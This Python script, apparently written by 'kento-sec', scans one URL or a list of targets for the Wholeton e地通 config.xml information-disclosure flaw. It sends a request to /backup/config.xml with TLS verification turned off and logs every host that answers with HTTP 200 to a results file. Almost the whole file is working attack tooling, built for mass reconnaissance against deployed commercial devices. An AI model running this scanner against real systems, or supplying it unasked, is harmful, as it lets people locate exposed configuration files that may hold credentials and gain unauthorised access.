import requests
import argparse
import urllib3
import sys

urllib3.disable_warnings()


def title():
    print("""
                                  惠尔顿e地通config.xml信息泄漏漏洞
                      use: python3 惠尔顿e地通config.xml信息泄漏漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Connection': 'close'
        }
        try:
            requests.packages.urllib3.disable_warnings()
            etc_passwd = requests.post(self.url + "/backup/config.xml", headers=headers, verify=False, timeout=2)
            # rt = etc_passwd.text
            if etc_passwd.status_code == 200:
                print("\033[32m[o]" + self.url + "存在惠尔顿e地通config.xml信息泄漏漏洞!" + "\033[0m")
                with open("惠尔顿e地通config.xml信息泄漏漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url +" 漏洞位置："+etc_passwd.url+ "\n")
            elif etc_passwd.status_code == 404:
                print(self.url+' 不存在惠尔顿e地通config.xml信息泄漏漏洞！')
            else:
                print(self.url + ' 不存在惠尔顿e地通config.xml信息泄漏漏洞！')
                pass

        except:
            print(self.url + ' 不存在惠尔顿e地通config.xml信息泄漏漏洞！')
            pass

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="惠尔顿e地通config.xml信息泄漏漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 惠尔顿e地通config.xml信息泄漏漏洞.py -u http://127.0.0.1\neg2:>>>python3 惠尔顿e地通config.xml信息泄漏漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
